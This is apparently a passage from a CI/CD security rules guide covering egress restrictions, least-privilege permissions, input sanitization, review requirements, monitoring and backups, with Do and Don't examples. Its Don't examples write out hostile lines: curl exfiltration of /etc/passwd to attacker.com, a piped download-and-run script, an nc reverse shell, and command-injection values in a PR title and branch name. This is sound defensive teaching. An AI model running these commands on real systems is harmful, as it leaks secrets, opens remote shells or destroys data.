**Why**: Runners execute arbitrary code and may have access to secrets, cloud credentials, and internal networks. Without isolation, malicious code from one job can access secrets from another. Fork PRs are especially dangerous as external contributors can execute code on your infrastructure.

**Refs**:
- CWE-250: Execution with Unnecessary Privileges
- OWASP CI/CD Top 10: CICD-SEC-6 Insufficient Credential Hygiene
- GitHub Actions Security Hardening
- GitLab Runner Security

---

## Rule: Network Security - Egress Restrictions

**Level**: `warning`

**When**: Configuring network access for CI/CD pipelines.

**Do**: Restrict egress traffic to known-good destinations.

```yaml
# GitHub Actions - OpenSSF Scorecard with network monitoring
name: Secure Build
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Set up network monitoring
        run: |
          # Log all outbound connections
          sudo iptables -A OUTPUT -j LOG --log-prefix "OUTBOUND: "

      - name: Build with network restrictions
        run: |
          # Only allow known registries
          npm config set registry https://registry.npmjs.org/
          pip config set global.index-url https://pypi.org/simple/
          npm ci
```

```yaml
# GitLab CI - Network policy for runners
# Kubernetes NetworkPolicy for GitLab Runner
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: gitlab-runner-egress
spec:
  podSelector:
    matchLabels:
      app: gitlab-runner
  policyTypes:
    - Egress
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              name: gitlab
      ports:
        - port: 443
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
      ports:
        - port: 443  # HTTPS only
        - port: 80   # HTTP (for redirects)
    # DNS
    - to:
        - namespaceSelector: {}
      ports:
        - port: 53
          protocol: UDP
```

```yaml
# Azure DevOps - Agent pool network isolation
# Deploy agents in isolated VNet with NSG rules
resource "azurerm_network_security_group" "devops_agent" {
  name = "devops-agent-nsg"

  security_rule {
    name                       = "AllowAzureDevOps"
    priority                   = 100
    direction                  = "Outbound"
    access                     = "Allow"
    protocol                   = "Tcp"
    destination_port_range     = "443"
    destination_address_prefix = "AzureDevOps"
  }

  security_rule {
    name                       = "DenyAllOutbound"
    priority                   = 4096
    direction                  = "Outbound"
    access                     = "Deny"
    protocol                   = "*"
    destination_address_prefix = "*"
  }
}
```

**Don't**: Allow unrestricted network access from CI/CD runners.

```yaml
# VULNERABLE: No egress restrictions
build:
  script:
    # Can exfiltrate data anywhere
    - curl -X POST https://attacker.com/exfil -d @/etc/passwd

    # Can download malicious tools
    - curl https://malware.com/backdoor.sh | bash

    # Can connect to command and control
    - nc attacker.com 4444 -e /bin/bash
```

**Why**: CI/CD pipelines have access to source code, secrets, and internal networks. Without egress restrictions, compromised pipelines can exfiltrate sensitive data, download additional malware, or establish persistent backdoors. Network restrictions limit the blast radius of compromised pipelines.

**Refs**:
- CWE-918: Server-Side Request Forgery (SSRF)
- OWASP CI/CD Top 10: CICD-SEC-8 Ungoverned Usage of 3rd Party Services
- NIST SP 800-123: Guide to General Server Security
- CIS Benchmark: Network Configuration

---

## Rule: Access Control - Least Privilege Permissions

**Level**: `strict`

**When**: Configuring access to CI/CD systems, repositories, and secrets.

**Do**: Implement least privilege with regular access reviews.

```yaml
# GitHub Actions - Minimal GITHUB_TOKEN permissions
name: CI
on: [push]

# Default to no permissions
permissions: {}

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read  # Only read source code
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm test

  publish:
    needs: build
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write  # Only write packages
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm publish
```

```yaml
# GitLab CI - Protected variables and environments
# Settings > CI/CD > Variables
# - Protect variable: Only available on protected branches
# - Mask variable: Hidden in job logs

# Settings > CI/CD > Protected Environments
# - Limit who can deploy
# - Require approval

deploy:
  stage: deploy
  environment:
    name: production
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
      when: manual
  # Only users with deploy permission can trigger
```

```hcl
# Terraform - Minimal IAM for CI/CD
resource "aws_iam_role" "github_actions" {
  name = "github-actions-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRoleWithWebIdentity"
      Effect = "Allow"
      Principal = {
        Federated = aws_iam_openid_connect_provider.github.arn
      }
      Condition = {
        StringLike = {
          "token.actions.githubusercontent.com:sub" = "repo:myorg/myrepo:*"
        }
      }
    }]
  })
}

resource "aws_iam_role_policy" "deploy" {
  name = "deploy-policy"
  role = aws_iam_role.github_actions.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "s3:PutObject",
          "s3:GetObject"
        ]
        Resource = "arn:aws:s3:::my-deploy-bucket/*"
      }
      # No additional permissions
    ]
  })
}
```

**Don't**: Grant excessive permissions to CI/CD systems.

```yaml
# VULNERABLE: Excessive permissions
name: CI
on: [push]

permissions: write-all  # Everything!

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      # GITHUB_TOKEN can now:
      # - Delete branches
      # - Merge PRs
      # - Create releases
      # - Modify workflows
```

```hcl
# VULNERABLE: Admin permissions for CI/CD
resource "aws_iam_role_policy_attachment" "github_actions" {
  role       = aws_iam_role.github_actions.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
  # Full AWS account access
}
```

**Why**: Excessive permissions amplify the impact of compromised pipelines. If a pipeline token can delete repositories, modify workflows, or access all secrets, a single vulnerability becomes catastrophic. Least privilege ensures compromised tokens have limited blast radius.

**Refs**:
- CWE-269: Improper Privilege Management
- OWASP CI/CD Top 10: CICD-SEC-2 Inadequate Identity and Access Management
- NIST SSDF PS.1: Protect All Forms of Code from Unauthorized Access
- Principle of Least Privilege (PoLP)

---

## Rule: Input Validation - Workflow Input Sanitization

**Level**: `strict`

**When**: Using external inputs in pipeline execution (PR titles, branch names, commit messages).

**Do**: Sanitize all external inputs before use in commands or scripts.

```yaml
# GitHub Actions - Safe input handling
name: PR Check
on:
  pull_request:
    types: [opened, synchronize]

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      # Safe: Using action input
      - name: Safe PR title check
        uses: actions/github-script@v7
        with:
          script: |
            const title = context.payload.pull_request.title;
            // Process title safely in JavaScript, not shell
            if (!title.match(/^[A-Z]+-\d+:/)) {
              core.setFailed('PR title must start with ticket number');
            }

      # Safe: Intermediate environment variable
      - name: Process with sanitization
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          # Use environment variable, not direct interpolation
          echo "Processing PR: ${PR_TITLE}"
```

```yaml
# GitLab CI - Input validation
validate_input:
  stage: validate
  script:
    # Validate branch name format
    - |
      if [[ ! "$CI_COMMIT_BRANCH" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        echo "Invalid branch name format"
        exit 1
      fi

    # Sanitize commit message for use
    - |
      SAFE_MESSAGE=$(echo "$CI_COMMIT_MESSAGE" | tr -cd '[:alnum:] ._-')
      echo "Commit: $SAFE_MESSAGE"
```

**Don't**: Use untrusted input directly in shell commands.

```yaml
# VULNERABLE: Command injection via PR title
name: PR Check
on:
  pull_request:

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: Echo PR title
        run: |
          # Attacker PR title: "fix: $(curl attacker.com/steal.sh | bash)"
          echo "PR Title: ${{ github.event.pull_request.title }}"
          # This executes the attacker's command!
```

```yaml
# VULNERABLE: Command injection via branch name
build:
  script:
    # Attacker branch: "feature-$(rm -rf /)*"
    - echo "Building branch $CI_COMMIT_REF_NAME"
    - docker build -t app:$CI_COMMIT_REF_NAME .
```

**Why**: External inputs (PR titles, commit messages, branch names) are attacker-controlled. Direct interpolation in shell commands allows command injection. Attackers can execute arbitrary commands, exfiltrate secrets, or compromise the build environment.

**Refs**:
- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- OWASP CI/CD Top 10: CICD-SEC-4 Poisoned Pipeline Execution (PPE)
- GitHub Actions Security Hardening

---

## Rule: Code Review - Required Reviews for Pipeline Changes

**Level**: `strict`

**When**: Modifying CI/CD pipeline configurations, workflow files, or deployment scripts.

**Do**: Require code review for all pipeline changes with appropriate reviewers.

```yaml
# GitHub CODEOWNERS
# File: .github/CODEOWNERS

# Require security team review for workflow changes
.github/workflows/ @security-team
.github/actions/ @platform-team @security-team

# Require DevOps review for infrastructure
terraform/ @devops-team
kubernetes/ @devops-team @security-team

# Require security review for sensitive areas
**/auth/ @security-team
**/crypto/ @security-team
```

```yaml
# GitHub Branch Protection Rules
# Settings > Branches > Branch protection rules

# For main branch:
# - Require pull request before merging
# - Require approvals: 2
# - Dismiss stale reviews
# - Require review from CODEOWNERS
# - Require status checks to pass
# - Require signed commits
# - Include administrators
```

```yaml
# GitLab Merge Request Approvals
# Settings > Merge requests > Merge request approvals

# Approval rules:
# - Security team must approve changes to .gitlab-ci.yml
# - Platform team must approve infrastructure changes
# - All changes require at least 2 approvals

# Protected branches:
# - No direct pushes to main
# - Require merge request
# - Require all approvals
```

**Don't**: Allow pipeline changes without review.

```yaml
# VULNERABLE: No review requirements
# - Anyone can push to main
# - No CODEOWNERS
# - No required reviewers
# - Workflows can be modified without approval

# Attacker scenario:
# 1. Attacker gets write access to repo
# 2. Modifies .github/workflows/deploy.yml
# 3. Adds step to exfiltrate secrets
# 4. Pushes directly to main
# 5. Secrets are stolen
```

**Why**: Pipeline configurations control build, test, and deployment processes. Malicious modifications can exfiltrate secrets, deploy backdoors, or compromise infrastructure. Required reviews ensure changes are vetted by qualified personnel before execution.

**Refs**:
- OWASP CI/CD Top 10: CICD-SEC-1 Insufficient Flow Control Mechanisms
- NIST SSDF PW.7: Review Software to Identify Vulnerabilities
- SLSA v1.1 Build L3: Hardened build platform; provenance is non-forgeable
- SOC 2 CC8.1: Change Management

---

## Rule: Monitoring and Alerting - Pipeline Anomaly Detection

**Level**: `warning`

**When**: Operating CI/CD systems in production.

**Do**: Monitor pipeline behavior and alert on anomalies.

```yaml
# GitHub Actions - Workflow run monitoring
name: Security Monitoring
on:
  workflow_run:
    workflows: ["*"]
    types: [completed]

jobs:
  monitor:
    runs-on: ubuntu-latest
    steps:
      - name: Check for anomalies
        uses: actions/github-script@v7
        with:
          script: |
            const run = context.payload.workflow_run;

            // Alert on unusual run time
            const duration = (new Date(run.updated_at) - new Date(run.created_at)) / 1000;
            if (duration > 3600) {
              core.warning(`Workflow ${run.name} took ${duration}s - investigate`);
            }

            // Alert on failure patterns
            if (run.conclusion === 'failure') {
              // Send to SIEM/alerting system
              console.log(`Failed workflow: ${run.name}`);
            }
```

```yaml
# GitLab CI - Pipeline monitoring with Prometheus
# gitlab.rb configuration
prometheus['enable'] = true
gitlab_rails['prometheus_address'] = '0.0.0.0:9090'

# Monitor these metrics:
# - gitlab_ci_pipeline_duration_seconds
# - gitlab_ci_pipeline_status
# - gitlab_ci_runner_jobs
# - gitlab_ci_pending_jobs
```

```yaml
# Alert rules for suspicious activity
groups:
  - name: cicd-security
    rules:
      - alert: UnusualPipelineDuration
        expr: gitlab_ci_pipeline_duration_seconds > 3600
        labels:
          severity: warning
        annotations:
          summary: "Pipeline running longer than expected"

      - alert: HighFailureRate
        expr: rate(gitlab_ci_pipeline_status{status="failed"}[1h]) > 0.5
        labels:
          severity: critical
        annotations:
          summary: "High pipeline failure rate detected"

      - alert: SecretsAccessAnomaly
        expr: rate(vault_secret_get_total[5m]) > 10
        labels:
          severity: critical
        annotations:
          summary: "Unusual secret access pattern detected"
```

**Don't**: Operate pipelines without monitoring.

```yaml
# VULNERABLE: No monitoring
# - No alerts on failures
# - No duration monitoring
# - No secret access logging
# - No anomaly detection

# Attacker can:
# - Run cryptominer undetected
# - Exfiltrate data slowly
# - Abuse resources without alerts
```

**Why**: Monitoring enables detection of compromised pipelines, abuse, and security incidents. Anomalies like unusual duration, unexpected network traffic, or high failure rates can indicate attacks. Without monitoring, breaches go undetected until significant damage occurs.

**Refs**:
- CWE-778: Insufficient Logging
- OWASP CI/CD Top 10: CICD-SEC-10 Insufficient Logging and Visibility
- NIST SSDF RV.1: Identify and Confirm Vulnerabilities
- SOC 2 CC7.2: System Monitoring

---

## Rule: Disaster Recovery - Pipeline Backup and Recovery

**Level**: `warning`

**When**: Operating production CI/CD systems.

**Do**: Maintain backups of pipeline configurations and test recovery procedures.

```yaml
# GitHub Actions - Export workflow configurations
name: Backup Workflows
on:
  schedule:
    - cron: '0 0 * * 0'  # Weekly

jobs:
  backup:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
        with:
          fetch-depth: 0  # Full history

      - name: Backup workflows
        run: |
          tar czf workflows-backup.tar.gz .github/workflows/
          sha256sum workflows-backup.tar.gz > workflows-backup.sha256

      - name: Upload to secure storage
        run: |
          aws s3 cp workflows-backup.tar.gz s3://backups/cicd/
          aws s3 cp workflows-backup.sha256 s3://backups/cicd/
```

```yaml
# GitLab - Backup CI/CD configuration
backup_config:
  stage: .post
  script:
    - |
      # Export CI/CD variables (encrypted)
      gitlab-rake gitlab:backup:create BACKUP=cicd_backup

      # Backup .gitlab-ci.yml
      cp .gitlab-ci.yml /backups/gitlab-ci.yml.backup

      # Backup runner configurations
      gitlab-runner list > /backups/runners.txt
  only:
    - schedules
```

```bash
# Recovery procedure documentation
# 1. Restore .github/workflows/ from backup
# 2. Verify workflow signatures
# 3. Restore environment secrets from vault
# 4. Test pipeline execution
# 5. Verify artifact signing keys
# 6. Test deployment to staging
```

**Don't**: Operate without backup and recovery procedures.

```yaml
# VULNERABLE: No backup strategy
# - Workflows only in git (can be deleted)
# - Secrets not backed up
# - No recovery procedures
# - No tested restoration process

# Scenario:
# 1. Attacker deletes workflows
# 2. Force pushes to remove history
# 3. No backup exists
# 4. Organization cannot build/deploy
```

**Why**: CI/CD systems are critical infrastructure. Without backups, ransomware, accidental deletion, or malicious insiders can cause extended outages. Recovery procedures must be tested to ensure they work when needed.

**Refs**:
- NIST SP 800-34: Contingency Planning Guide
- SOC 2 A1.2: Recovery Testing
- ISO 27001 A.12.3: Information Backup
- OWASP CI/CD Top 10: CICD-SEC-10 Insufficient Logging and Visibility

---

## Summary

These core CI/CD security rules provide foundational protection for continuous integration and deployment systems. Key principles:

1. **Never hardcode secrets** - Use secret management with rotation
2. **Sign and verify artifacts** - Ensure integrity throughout supply chain
3. **Pin dependencies** - Prevent supply chain attacks
4. **Implement least privilege** - Minimize blast radius of compromise
5. **Sanitize all inputs** - Prevent command injection
6. **Require reviews** - Ensure pipeline changes are vetted
7. **Monitor and alert** - Detect anomalies and incidents
8. **Maintain backups** - Enable rapid recovery from incidents

Implement these rules in combination with platform-specific rules (GitHub Actions, GitLab CI) for comprehensive CI/CD security.
